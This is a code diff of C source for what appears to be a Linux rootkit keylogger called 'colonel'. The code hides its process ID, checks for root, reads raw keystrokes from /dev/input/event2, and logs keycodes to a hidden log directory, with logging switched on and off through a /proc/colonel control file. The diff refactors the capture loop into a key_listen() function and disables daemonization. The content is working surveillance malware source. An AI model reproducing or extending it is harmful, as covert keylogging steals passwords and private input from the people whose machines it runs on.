@@ -139,66 +139,23 @@ int key_listen(void) {
 		}
 	}
 	fclose(evlog);
-
+	return 0;
 }
 
 int main(void) {
 	int input_device;								/* will read from device event file */
 	
-	daemonize();
+	//daemonize();
 	setup_dirs();
 
 	error_log = fopen("./col_log/log.txt", "a+"); 					/* daemon log */
 	input_device = open("/dev/input/event2", O_RDONLY);			        /* key event file */
 
 	hide_pid();
+	puts("Now root...");
 	is_root();
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
-//	key_listen();	
-
-	int control_file;
-	int input_device;								/* will read from device event file */
-	char listening = 1;								/* toggles keylogger on/off */
-	char cmd[1024];									/* stores commands */
-	char kl[13] = "keylogger: 0";							/* defines what keylogger is listening for on /proc/colonel */
-	char *toggle;									/* listens for keylogger cmd */
-	struct input_event ev;								/* using input_event so we know what we're reading from the event file */
-	time_t curtime;
-	time(&curtime);									/* set the current time */
-	
-	while(1) {				
-		fflush(error_log);
-		read(input_device, &ev, sizeof(struct input_event));	                /* read from /dev/input/eventX */
-		control_file = open("/proc/colonel", O_RDONLY);                         /* read from /proc/colonel */
-		read(control_file, cmd, sizeof(cmd));			                /* read from /proc/colonel */
-		toggle = strstr(cmd, kl);				                /* looks for change in /proc/colonel */
-
-		if ((0 == listening) && (toggle != NULL)) {
-			listening = !listening;
-        		evlog = fopen("./col_log/evlog.txt", "a+");          		/* key log */
-            		if (NULL == evlog) {
-                		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
-                		exit(1);
-            		}	
-			system_timestamp();
-			close(control_file);
-			continue;
-
-		} else if ((1 == ev.type) && (1 == listening)) {	                /* if typing (ev.type = 1) and keylogger is on */
-            		fprintf(evlog, "%i,%i-", ev.code, ev.value);         		/* grabs keyboard input -- 
-											 * ev.code = keycode, ev.value = key state (0: key up, 1: key down) */
-			fflush(evlog);
-			control_file = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
-			if (NULL == toggle) {
-				listening = !listening;
-                		fclose(evlog);
-				fprintf(error_log, "End listening -- %s", ctime(&curtime));
-				close(control_file);
-				continue;
-			}
-		}
-	}
-	fclose(evlog);
+	key_listen();	
 	fclose(error_log);
 	return 0;
 }
